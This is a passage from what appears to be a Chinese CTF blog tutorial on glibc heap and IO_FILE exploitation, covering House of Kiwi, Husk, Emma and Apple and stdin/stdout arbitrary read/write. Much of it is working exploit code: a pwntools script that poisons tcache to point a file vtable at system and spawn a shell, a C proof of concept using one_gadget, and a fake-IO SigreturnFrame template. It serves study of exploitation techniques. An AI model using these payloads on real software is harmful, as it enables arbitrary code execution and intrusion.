class="hljs-comment"># 7</span><br>add(<span class="hljs-number">0x18</span>,<span class="hljs-number">8</span>) <span class="hljs-comment"># 8</span><br><br><span class="hljs-comment"># chunk1 -&gt; size = 0x40</span><br>edit(<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>+<span class="hljs-string">&#x27;\x41&#x27;</span>)<br>dele(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">0x38</span>,<span class="hljs-number">1</span>)<br><br><span class="hljs-comment"># chunk2 -&gt; size = 0x460 Create a unsortedbin</span><br>edit(<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;u&#x27;</span>*<span class="hljs-number">0x18</span> + p64(<span class="hljs-number">0x20</span> + <span class="hljs-number">0x110</span>*<span class="hljs-number">4</span> + <span class="hljs-number">1</span>) + <span class="hljs-string">&#x27;\n&#x27;</span>)<br>dele(<span class="hljs-number">2</span>)<br><br><span class="hljs-comment"># Leak libc</span><br>add(<span class="hljs-number">0x18</span>,<span class="hljs-number">2</span>)<br>show(<span class="hljs-number">2</span>)<br>libc_leak = uu64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>,drop=<span class="hljs-literal">False</span>)[-<span class="hljs-number">6</span>:])<br>libc_base = libc_leak - <span class="hljs-number">0x1ebf75</span><br>lg(<span class="hljs-string">&#x27;libc_leak&#x27;</span>,libc_leak)<br>lg(<span class="hljs-string">&#x27;libc_base&#x27;</span>,libc_base)<br>libc = elf.libc<br>libc.address = libc_base<br><br>magic = libc.sym.setcontext + <span class="hljs-number">61</span><br>__sync = libc.sym._IO_file_jumps + <span class="hljs-number">0x60</span><br>_IO_helper_jumps = libc_base + <span class="hljs-number">0x1ec8a0</span><br><br><span class="hljs-comment"># Tcache Poisoning1 _IO_file_jumps -&gt; __sync = system</span><br>dele(<span class="hljs-number">7</span>)<br>dele(<span class="hljs-number">2</span>)<br>edit(<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;u&#x27;</span>*<span class="hljs-number">0x18</span>+p64(<span class="hljs-number">0x21</span>)+p64(__sync) + p64(<span class="hljs-number">0</span>) + <span class="hljs-string">&#x27;\n&#x27;</span>)<br>add(<span class="hljs-number">0x18</span>,<span class="hljs-number">2</span>)<br>add(<span class="hljs-number">0x18</span>,<span class="hljs-number">7</span>,p64(libc.sym.system))<br><br><span class="hljs-comment"># Tcache Poisoning2 _IO_2_1_stderr_ -&gt; _flags = &#x27;/bin/sh\0&#x27;</span><br>dele(<span class="hljs-number">0</span>)<br>dele(<span class="hljs-number">2</span>)<br>edit(<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;u&#x27;</span>*<span class="hljs-number">0x18</span>+p64(<span class="hljs-number">0x21</span>)+p64(libc.sym._IO_2_1_stderr_) + p64(<span class="hljs-number">0</span>) + <span class="hljs-string">&#x27;\n&#x27;</span>)<br>add(<span class="hljs-number">0x18</span>,<span class="hljs-number">2</span>)<br>add(<span class="hljs-number">0x18</span>,<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;/bin/sh\0&#x27;</span>)<br><br><span class="hljs-comment"># Tcache Poisoning3 main_arena -&gt; top = &amp;main_arena - 0x10 </span><br>dele(<span class="hljs-number">8</span>)<br>dele(<span class="hljs-number">2</span>)<br>edit(<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;u&#x27;</span>*<span class="hljs-number">0x18</span>+p64(<span class="hljs-number">0x21</span>)+p64(libc_base + <span class="hljs-number">0x1ebbe0</span>) + p64(<span class="hljs-number">0</span>) + <span class="hljs-string">&#x27;\n&#x27;</span>)<br>add(<span class="hljs-number">0x18</span>,<span class="hljs-number">2</span>)<br>add(<span class="hljs-number">0x18</span>,<span class="hljs-number">8</span>,p64(libc_base + <span class="hljs-number">0x1ebbe0</span> - <span class="hljs-number">96</span> - <span class="hljs-number">16</span>)*<span class="hljs-number">2</span>)<br><br><span class="hljs-comment"># Trigger kiwi ~~</span><br>gift()<br><br>p.interactive()<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c">In file: /home/caffe1ne/Exps/Glibc/glibc<span class="hljs-number">-2.31</span>/libio/iofflush.c<br>   <span class="hljs-number">34</span>     <span class="hljs-keyword">return</span> _IO_flush_all ();<br>   <span class="hljs-number">35</span>   <span class="hljs-keyword">else</span><br>   <span class="hljs-number">36</span>     &#123;<br>   <span class="hljs-number">37</span>       <span class="hljs-type">int</span> result;<br>   <span class="hljs-number">38</span>       CHECK_FILE (fp, EOF);<br> ► <span class="hljs-number">39</span>       _IO_acquire_lock (fp);<br>   <span class="hljs-number">40</span>       result = _IO_SYNC (fp) ? EOF : <span class="hljs-number">0</span>;<br>   <span class="hljs-number">41</span>       _IO_release_lock (fp);<br>   <span class="hljs-number">42</span>       <span class="hljs-keyword">return</span> result;<br>   <span class="hljs-number">43</span>     &#125;<br>   <span class="hljs-number">44</span> &#125;<br></code></pre></td></tr></table></figure><p>在运行 <strong>_IO_SYNC (fp)</strong> 时运行的就是 <code>system('/bin/sh')</code> 。</p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/links/image-20220526182847525.png" alt="image-20220526182847525" style="zoom:67%;" /><hr><h3 id="House-of-Husk"><a class="header-anchor" href="#House-of-Husk">¶</a>House of Husk</h3><p>这条利用路线比较简单，条件是俩次任意写或者俩次 Largebin Attack。</p><h4 id="原理-v2"><a class="header-anchor" href="#原理-v2">¶</a>原理</h4><p><strong>printf_positional</strong> 的 <strong>printf-parsemb</strong> 函数中对处理各种格式化字符串的标识符( <code>%p</code>,<code>%X</code> 等)：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Get the format specification.  */</span><br>spec-&gt;info.spec = (<span class="hljs-type">wchar_t</span>) *format++;<br>spec-&gt;size = <span class="hljs-number">-1</span>;<br><span class="hljs-keyword">if</span> (__builtin_expect (__printf_function_table == <span class="hljs-literal">NULL</span>, <span class="hljs-number">1</span>)<br>    || spec-&gt;info.spec &gt; UCHAR_MAX<br>    || __printf_arginfo_table[spec-&gt;info.spec] == <span class="hljs-literal">NULL</span><br>    <span class="hljs-comment">/* We don&#x27;t try to get the types for all arguments if the format</span><br><span class="hljs-comment">uses more than one.  The normal case is covered though.  If</span><br><span class="hljs-comment">the call returns -1 we continue with the normal specifiers.  */</span><br>    || (<span class="hljs-type">int</span>) (spec-&gt;ndata_args = (*__printf_arginfo_table[spec-&gt;info.spec])<br>   (&amp;spec-&gt;info, <span class="hljs-number">1</span>, &amp;spec-&gt;data_arg_type,<br>    &amp;spec-&gt;size)) &lt; <span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure><p>当 <code>__printf_function_table != NULL</code> 并且 <code>__printf_arginfo_table[sepc] != NULL</code> 时，会调用 <code>__printf_function_table[(size_t) spec]</code> 处的函数。</p><p>指定标识符偏移计算，以 ‘X’ 为例：<br>$$<br>(ord(char) -2)*8\<br>(ord(‘X’)-2)<em>8=86</em>8=688=0x2b0<br>$$<br>相应的我们得到最常用到的 <code>%s</code> 偏移为 <strong>0x388</strong> 。</p><p>注意这里 <strong>-2</strong> 是因为从内存区域<strong>而不是chunk头</strong>计算，从 chunk 头部计算就不要减二了。例如 <code>%s</code> 为 $ord(‘s’)*8=0x398$ ，👴 就是被这玩意坑了，不希望大 🔥 也上当受骗。</p><h4 id="使用场景-v2"><a class="header-anchor" href="#使用场景-v2">¶</a>使用场景</h4><p>能控制 <strong>__printf_arginfo_table,__printf_function_table</strong> 为堆地址，以在制定偏移处写我们的目标函数，这俩张表都能写函数，调用位置不同。</p><p><strong>one_gadget</strong> 起效时，<strong>husk</strong> 有奇效，非常好用。不起效或开了沙箱时，可以在函数表写 <strong>exit</strong> 进入 exit 流程，配合其他高版本 house 使用。</p><h4 id="Demo-v3"><a class="header-anchor" href="#Demo-v3">¶</a>Demo</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// ptr-yudai/House-of-Husk/blob/master/poc-husk.c</span><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Husk&#x27;s method - House of Husk</span><br><span class="hljs-comment"> * This PoC is supposed to be run with libc-2.27</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> offset2size(ofs) ((ofs) * 2 - 0x10)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAIN_ARENA       0x3ebc40</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAIN_ARENA_DELTA 0x60</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> GLOBAL_MAX_FAST  0x3ed940</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PRINTF_FUNCTABLE 0x3f0658</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PRINTF_ARGINFO   0x3ec870</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ONE_GADGET       0x10a38c</span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span> <span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> libc_base;<br>  <span class="hljs-type">char</span> *a[<span class="hljs-number">10</span>];<br>  setbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-literal">NULL</span>);<br>  setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-literal">NULL</span>); <span class="hljs-comment">// make printf quiet</span><br><br>  <span class="hljs-comment">/* leak libc */</span><br>  a[<span class="hljs-number">0</span>] = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x500</span>); <span class="hljs-comment">/* UAF chunk */</span><br>  a[<span class="hljs-number">1</span>] = <span class="hljs-built_in">malloc</span>(offset2size(PRINTF_FUNCTABLE - MAIN_ARENA));<br>  a[<span class="hljs-number">2</span>] = <span class="hljs-built_in">malloc</span>(offset2size(PRINTF_ARGINFO - MAIN_ARENA));<br>  a[<span class="hljs-number">3</span>] = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x500</span>); <span class="hljs-comment">/* avoid consolidation */</span><br>  <span class="hljs-built_in">free</span>(a[<span class="hljs-number">0</span>]);<br>  libc_base = *(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>*)a[<span class="hljs-number">0</span>] - MAIN_ARENA - MAIN_ARENA_DELTA;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;libc @ 0x%lx\n&quot;</span>, libc_base);<br><br>  <span class="hljs-comment">/* prepare fake printf arginfo table */</span><br>  *(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>*)(a[<span class="hljs-number">2</span>] + (<span class="hljs-string">&#x27;X&#x27;</span> - <span class="hljs-number">2</span>) * <span class="hljs-number">8</span>) = libc_base + ONE_GADGET;<br><br>  <span class="hljs-comment">/* unsorted bin attack */</span><br>  *(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>*)(a[<span class="hljs-number">0</span>] + <span class="hljs-number">8</span>) = libc_base + GLOBAL_MAX_FAST - <span class="hljs-number">0x10</span>;<br>  a[<span class="hljs-number">0</span>] = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x500</span>); <span class="hljs-comment">/* overwrite global_max_fast */</span><br><br>  <span class="hljs-comment">/* overwrite __printf_arginfo_table */</span><br>  <span class="hljs-built_in">free</span>(a[<span class="hljs-number">1</span>]);<br>  <span class="hljs-built_in">free</span>(a[<span class="hljs-number">2</span>]);<br><br>  <span class="hljs-comment">/* ignite! */</span><br>  getchar();<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%X&quot;</span>, <span class="hljs-number">0</span>);<br>  <br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><hr><h3 id="House-of-Emma"><a class="header-anchor" href="#House-of-Emma">¶</a>House of Emma</h3><p>2.24 以后，glibc 加入了对 IOFILE 结构体的 vtable 是否在指定区间的检测。自 2.27 的高版本起，我们常用的俩个函数(_IO_str_overflow 与 _IO_str_finish)中的函数指针也被替换成了 malloc 和 free。于是我们把目光转移到合法区间内的可利用函数。</p><h4 id="使用场景-v3"><a class="header-anchor" href="#使用场景-v3">¶</a>使用场景</h4><ol><li>可以任意写一个可控地址（LargeBin Attack、Tcache Stashing Unlink Attack…）</li><li>可以触发 IO 流（FSOP、<a href="https://www.anquanke.com/post/id/235598">House OF Kiwi</a>）</li></ol><h4 id="原理-v3"><a class="header-anchor" href="#原理-v3">¶</a>原理</h4><p>在 vtable 的合法范围内，存在一个 _IO_cookie_jumps ， _IO_cookie_jumps 中存在下列函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">ssize_t</span><br>_IO_cookie_read (FILE *fp, <span class="hljs-type">void</span> *buf, <span class="hljs-type">ssize_t</span> size)<br>&#123;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_cookie_file</span> *<span class="hljs-title">cfile</span> =</span> (<span class="hljs-keyword">struct</span> _IO_cookie_file *) fp;<br>  <span class="hljs-type">cookie_read_function_t</span> *read_cb = cfile-&gt;__io_functions.read;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> PTR_DEMANGLE</span><br>  PTR_DEMANGLE (read_cb);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>  <span class="hljs-keyword">if</span> (read_cb == <span class="hljs-literal">NULL</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br><br>  <span class="hljs-keyword">return</span> read_cb (cfile-&gt;__cookie, buf, size);<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">ssize_t</span><br>_IO_cookie_write (FILE *fp, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *buf, <span class="hljs-type">ssize_t</span> size)<br>&#123;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_cookie_file</span> *<span class="hljs-title">cfile</span> =</span> (<span class="hljs-keyword">struct</span> _IO_cookie_file *) fp;<br>  <span class="hljs-type">cookie_write_function_t</span> *write_cb = cfile-&gt;__io_functions.write;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> PTR_DEMANGLE</span><br>  PTR_DEMANGLE (write_cb);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>  <span class="hljs-keyword">if</span> (write_cb == <span class="hljs-literal">NULL</span>)<br>    &#123;<br>      fp-&gt;_flags |= _IO_ERR_SEEN;<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br><br>  <span class="hljs-type">ssize_t</span> n = write_cb (cfile-&gt;__cookie, buf, size);<br>  <span class="hljs-keyword">if</span> (n &lt; size)<br>    fp-&gt;_flags |= _IO_ERR_SEEN;<br><br>  <span class="hljs-keyword">return</span> n;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里调用的函数指针 <code>read_cb</code> 和 <code>write_cb</code> 和 2.27 版本的利用一样，都是以 IOFILE 结构体为基寻址的，我们可以轻易的控制这些函数指针。</p><p>可惜的是，并没有 2.27 版本那么简单，如上代码中存在以下保护：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> PTR_DEMANGLE</span><br>  PTR_DEMANGLE (write_cb);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br></code></pre></td></tr></table></figure><p>总所周知，glibc 里面的宏都是比较抽象的，这个地方最好还是结合调试来看：</p><p>看不到就是还在咕。</p><hr><h3 id="House-of-Apple"><a class="header-anchor" href="#House-of-Apple">¶</a>House of Apple</h3><p>其实有了 apple 之后，其他的反而显得没那么重要了，暂时 IOFILE 系列就搁置在这了，以后再更~ 还是先放个模板</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python">_IO_wfile_jumps = libc_base + <span class="hljs-number">0x2160c0</span><br>target_chunk = heap_base + <span class="hljs-number">0xcf0</span><br>addr = target_chunk + <span class="hljs-number">0x200</span><br>fake_frame = SigreturnFrame()<br>fake_frame.rdi = <span class="hljs-number">0</span><br>fake_frame.rsi = addr<br>fake_frame.rdx = <span class="hljs-number">0x300</span><br>fake_frame.rsp = addr<br>fake_frame.rip = libc.sym.read<br>fake_io = <span class="hljs-string">&#x27;\0&#x27;</span>*<span class="hljs-number">0x28</span> + p64(<span class="hljs-number">0xffffffffffffffff</span>)<br>fake_io = fake_io.ljust(<span class="hljs-number">0x88</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)<br>fake_io += p64(target_chunk+<span class="hljs-number">0x30</span>)<br>fake_io = fake_io.ljust(<span class="hljs-number">0xa0</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)<br>fake_io += p64(target_chunk+<span class="hljs-number">0xd0</span>)   <span class="hljs-comment"># RDX</span><br>fake_io = fake_io.ljust(<span class="hljs-number">0xd8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)<br>fake_io += p64(_IO_wfile_jumps)<br>fake_io += <span class="hljs-built_in">str</span>(fake_frame)[:<span class="hljs-number">0xe0</span>]<br>fake_io += p64(target_chunk+<span class="hljs-number">0xd0</span>+<span class="hljs-number">0xe0</span>+<span class="hljs-number">8</span>-<span class="hljs-number">0x68</span>) + p64(magic)<br>edit(<span class="hljs-number">2</span>,fake_io[<span class="hljs-number">0x10</span>:])<br>menu(<span class="hljs-number">0</span>)<br>rop_chain = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">8</span>+<span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">8</span><br>sleep(<span class="hljs-number">1</span>)<br>sl(rop_chain)<br></code></pre></td></tr></table></figure><hr><h2 id="stdin-任意写"><a class="header-anchor" href="#stdin-任意写">¶</a>stdin 任意写</h2><p><strong>注意</strong>：<code>scanf</code>，<code>fread</code>，<code>gets</code>等读入走<code>IO</code>指针（<code>read</code>不走）。<br><strong>大体流程</strong>为：若<code>_IO_buf_base</code>为空，则调用<code>_IO_doallocbuf</code>去初始化输入缓冲区，然后判断输入缓冲区是否存在剩余数据，如果输入缓冲区有剩余数据（<code>_IO_read_end &gt; _IO_read_ptr</code>）则将其<strong>直接拷贝至目标地址</strong>（不会对此时输入的数据进行读入），如果没有或不够，则调用<code>__underflow</code>函数<strong>执行系统调用读取数据</strong>（<code>SYS_read</code>）到输入缓冲区（从<code>_IO_buf_base</code>到<code>_IO_buf_end</code>，默认<code>0x400</code>，即将数据读到<code>_IO_buf_base</code>，读取<code>0x400</code>个字节），此时若实际读入了<code>n</code>个字节的数据，则<code>_IO_read_end = _IO_buf_base + n</code>（即<code>_IO_read_end</code>指向实际读入的最后一个字节的数据），之后再将输入缓冲区中的数据拷贝到目标地址。<br>这里需要注意的是，若输入缓冲区中没有剩余的数据，则每次读入数据进输入缓冲区，仅和<code>_IO_buf_base</code>与<code>_IO_buf_end</code>有关。<br>在将数据从输入缓冲区拷贝到目标地址的过程中，<strong>需要满足所调用的读入函数的自身的限制条件</strong>，例如：使用<code>scanf(&quot;%d&quot;,&amp;a)</code>读入整数，则当在输入缓冲区中遇到了字符（或<code>scanf</code>的一些截断符）等不符合的情况，就会停止这个拷贝的过程。最终，<code>_IO_read_ptr</code>指向成功拷贝到目的地址中的最后一个字节数据在输入缓冲区中的地址。因此，若是遇到了不符合限制条件的情况而终止拷贝，则最终会使得<code>_IO_read_end &gt; _IO_read_ptr</code>，即再下一次读入之前会被认定为输入缓冲区中仍有剩余数据，在此情况下，<strong>很有可能不会进行此次读入</strong>，或将输入缓冲区中剩余的数据拷贝到此次读入的目标地址，从而<strong>导致读入的错误</strong>。<br><code>getchar()</code>和<code>IO_getc()</code>的作用是刷新<code>_IO_read_ptr</code>，每次调用，会从输入缓冲区读一个字节数据，即将<code>_IO_read_ptr++</code>。</p><h3 id="相关源码"><a class="header-anchor" href="#相关源码">¶</a><strong>相关源码</strong></h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c">_IO_size_t _IO_file_xsgetn (_IO_FILE *fp, <span class="hljs-type">void</span> *data, _IO_size_t n)<br>&#123;<br> ...<br>  <span class="hljs-keyword">if</span> (fp-&gt;_IO_buf_base == <span class="hljs-literal">NULL</span>)<br>    &#123;<br>      ...<br>      <span class="hljs-comment">//输入缓冲区为空则初始化输入缓冲区</span><br>    &#125;<br>  <span class="hljs-keyword">while</span> (want &gt; <span class="hljs-number">0</span>)<br>    &#123;<br>      have = fp-&gt;_IO_read_end - fp-&gt;_IO_read_ptr;<br>      <span class="hljs-keyword">if</span> (have &gt; <span class="hljs-number">0</span>)<br>        &#123;<br>          ...<br>          <span class="hljs-comment">//memcpy</span><br> <br>        &#125;<br>      <span class="hljs-keyword">if</span> (fp-&gt;_IO_buf_base<br>          &amp;&amp; want &lt; (<span class="hljs-type">size_t</span>) (fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base))<br>        &#123;<br>          <span class="hljs-keyword">if</span> (__underflow (fp) == EOF)  <span class="hljs-comment">// 调用__underflow读入数据</span><br>          ...<br>        &#125;<br>      ...<br>  <span class="hljs-keyword">return</span> n - want;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> _IO_new_file_underflow (_IO_FILE *fp)<br>&#123;<br>  _IO_ssize_t count;<br>  ...<br>  <span class="hljs-comment">// 会检查_flags是否包含_IO_NO_READS标志，包含则直接返回。</span><br>  <span class="hljs-comment">// 标志的定义是#define _IO_NO_READS 4，因此_flags不能包含4。</span><br>  <span class="hljs-keyword">if</span> (fp-&gt;_flags &amp; _IO_NO_READS)<br>    &#123;<br>      fp-&gt;_flags |= _IO_ERR_SEEN;<br>      __set_errno (EBADF);<br>      <span class="hljs-keyword">return</span> EOF;<br>    &#125;<br>  <span class="hljs-comment">// 如果输入缓冲区里存在数据，则直接返回</span><br>  <span class="hljs-keyword">if</span> (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)<br>    <span class="hljs-keyword">return</span> *(<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *) fp-&gt;_IO_read_ptr;<br>  ...<br>  <span class="hljs-comment">// 调用_IO_SYSREAD函数最终执行系统调用读取数据</span><br>  count = _IO_SYSREAD (fp, fp-&gt;_IO_buf_base,<br>               fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base);<br>  ...<br>&#125;<br>libc_hidden_ver (_IO_new_file_underflow, _IO_file_underflow)<br></code></pre></td></tr></table></figure><p>综上，<strong>stdin</strong> 为了做到<strong>任意写</strong>，满足如下条件，即可进行利用：<br>(1) 设置<code>_IO_read_end</code>等于<code>_IO_read_ptr</code>（使得输入缓冲区内没有剩余数据，从而可以从用户读入数据）。<br>(2) 设置<code>_flag &amp;~ _IO_NO_READS</code>即<code>_flag &amp;~ 0x4</code>（一般不用特意设置）。<br>(3) 设置<code>_fileno</code>为<code>0</code>（一般不用特意设置）。<br>(4) 设置<code>_IO_buf_base</code>为<code>write_start</code>，<code>_IO_buf_end</code>为<code>write_end</code>（我们目标写的起始地址是<code>write_start</code>，写结束地址为<code>write_end</code>），且使得<code>_IO_buf_end-_IO_buf_base</code>大于要写入的数据长度。</p><h2 id="stdout-任意读写"><a class="header-anchor" href="#stdout-任意读写">¶</a>stdout 任意读写</h2><p><strong>注意</strong>：<code>printf</code>，<code>fwrite</code>，<code>puts</code>等输出走<code>IO</code>指针（<code>write</code>不走）。<br>在<code>_IO_2_1_stdout_</code>中，<code>_IO_buf_base</code>和<code>_IO_buf_end</code>为输出缓冲区起始位置（默认大小为<code>0x400</code>），在输出的过程中，会先将需要输出的数据从目标地址拷贝到输出缓冲区，再从输出缓冲区输出给用户。<br>缓冲区建立函数<code>_IO_doallocbuf</code>会建立输出缓冲区，并把基地址保存在<code>_IO_buf_base</code>中，结束地址保存在<code>_IO_buf_end</code>中。在建立里输出缓冲区后，会将基址址给<code>_IO_write_base</code>，若是设置的是全缓冲模式<code>_IO_FULL_BUF</code>，则会将结束地址给<code>_IO_write_end</code>，若是设置的是行缓冲模式<code>_IO_LINE_BUF</code>，则<code>_IO_write_end</code>中存的是<code>_IO_buf_base</code>，此外，<code>_IO_write_ptr</code>表示输出缓冲区中已经使用到的地址。即<code>_IO_write_base</code>到<code>_IO_write_ptr</code>之间的空间是已经使用的缓冲区，<code>_IO_write_ptr</code>到<code>_IO_write_end</code>之间为剩余的输出缓冲区。<br>最终实际调用了<code>_IO_2_1_stdout_</code>的<code>vtable</code>中的<code>_xsputn</code>，也就是<code>_IO_new_file_xsputn</code>函数，源码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span 